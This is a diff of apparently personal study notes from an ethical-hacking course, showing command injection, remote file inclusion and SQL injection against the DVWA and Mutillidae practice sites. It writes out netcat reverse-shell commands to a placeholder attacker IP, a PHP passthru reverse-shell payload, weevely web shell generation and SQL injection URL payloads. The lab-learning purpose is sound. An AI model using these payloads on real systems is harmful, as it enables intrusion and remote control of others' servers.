@@ -225,8 +225,13 @@ _These tools are covered in other sections of this obsidan file._
 
 **Remote Code Execution (RCE)**
 
+DVWA login credentials
+Username: admin
+Password: password
+
 We can use the metasploitable VM to test this in the DVWA website. Here, under command execution, it allows the user to use the ping command. If we add a `;` after entering a ping command the bash shell will do another command of our choice.
 For example:
+
 ```sh
 google.com; ls
 ```
@@ -235,12 +240,14 @@ You can see that it executes both commands. You could easily get the system to e
 
 Start netcat on the Kali machine
 ```sh
-nc -l -p 4444
+nc -l -v -p 4444
 ```
+- l - Listen
+- v - verbose
 
 On the DVWA site
 ```sh 
-google.com; nc -e /bin/bash <attacker-ip> -p 4444
+google.com; nc -e /bin/bash <attacker-ip> 4444
 ```
 - e - Executes a shell (can also use sh)
 
@@ -259,10 +266,11 @@ I like to use PentesterMonkey Reverse PHP shell located in Kali > exploits > PHP
 
 We can also use tools like weevely:
 ```sh
-sudo weevely generate 12345 /shell.php
+sudo weevely generate 12345 /home/kali/shell.php
 ```
 - 12345 - Attacker defined password
 - /shell.php - Desired file location (would be put into the root directory)
+- weevely seemed to have an issue looking for a module `telnetlib` and didn't work
 
 The DVWA site gives you the exact location of where it stored our file but in a real website you would have to discover it yourself. You could look up what the site is running and then look online for possible default locations of stored upload files, for example.
 
@@ -295,14 +303,16 @@ nano /etc/php5/cgi/php.ini
 ```
 - We are looking for `allow_url_include = ON` 
 - You can search in Nano by using `CTL+W <string> Enter`
+- Search for `allow_url`
 
 Creating a pass-through function.php on Kali to grab from the dvwa site:
 ```php
 <?php
-passthru(*nc -e /bin/bash <attacker-ip> -p 4444*);
+passthru("nc -e /bin/bash <attacker-ip> 4444");
 ?>
 ```
-- Now move the file to the Kali server `/var/www/html/file.php`
+- Now move the file to the Kali server `/var/www/html/file.txt`
+- In the URL of dvwa we can add a `?` to make the file run as php
 
 Make sure your Kali server is running so dvwa can get the file:
 ```sh
@@ -311,14 +321,14 @@ sudo service apache2 start
 
 Now on the dvwa site we can modify the url to look like this:
 ```sh
-http://<website-ip>/dvwa/vulnerabilities/fi/?page=http://<attacker-ip>/file.php
+http://<website-ip>/dvwa/vulnerabilities/fi/?page=http://<attacker-ip>/file.txt?
 ```
 - You might need to add a `?` at the end of the URL so the website runs the PHP code.
 - It may be required to turn it from a PHP file to a text file depending on what the server accepts, in that case you would need the `?`
 
 Start a listener:
 ```sh
-nc -l -p 4444
+nc -l -v -p 4444
 ```
 
 Now use the URL on the DVWA website to hopefully get the reverse shell.
@@ -496,7 +506,7 @@ mysql -u root
 ```
 
 ```sh
-show databases
+show databases;
 ```
 
 ```sh
@@ -525,20 +535,26 @@ We start by adding a single quote to the password field:
 Name: username
 Password: '
 
+The error should appear above the login fields.
+
 You should try this single quote in all of the fields to see if any of them are vulnerable to SQL injection.
 
 If the website returns an error then it's vulnerable to SQL injection. It does this because in the database it breaks the SQL command. Most modern websites will not reveal any error information but you can use a sleep command, for example, to see if the webpage hangs (freezes) 
 
 Simple SQL payload attacking the password field:
 ```sh
-12345' and 1=1#
+<user-password>' and 1=1#
 ```
-- The `12345` might have to be the correct password but i don't have Kali installed to test it yet. I'll update the notes when i go through everything after finishing the course.
 - This tells you if the website allows you to use SQL or not.
 
 Switch the website to Owasp top 10 >  A1 - Injection > SQL - Extra Data > User Info and add the user details that you made into the fields. It will change the URL to match what you entered in a URL format. Try changing the username to see what happens!
 
 This is called the GET method. I think you can run curl on the site and it will tell you if GET is allowed or not. If it's POST you will not be able to see it in the URL.
+
+URL after entering the correct data
+```url
+http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=bill&password=P%40ssw0rd&user-info-php-submit-button=View+Account+Details
+```
 
 To find out if you can use SQL we can add something to the URL to check, for example after the username add:
 ```sh
@@ -547,6 +563,14 @@ To find out if you can use SQL we can add something to the URL to check, for exa
 - %23 - URL encoded version of #
 - The comment tells the site to ignore everything after it and sees it as a comment.
 - You could also find out how many columns are in the table using this method, you would keep increasing the order number until it returns an error.
+
+Payload
+```url
+http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=bill' order by 1 %23&password=P%40ssw0rd&user-info-php-submit-button=View+Account+Details
+```
+- Shows if you can use SQL injection or not
+
+Taking a break here because i can't get the sql to work and it looks like it's using the wrong database even though i updated it in the `config.inc`
 
 **Terminology:**
 A table is a collection of rows having one or more columns. A row is a value of a row type. Every row of the same table has the same row type. **The value of the i-th field of every row in a table is the value of the i-th column of that row in the table**. The row is the smallest unit of data that can be inserted into a table and deleted from a table.
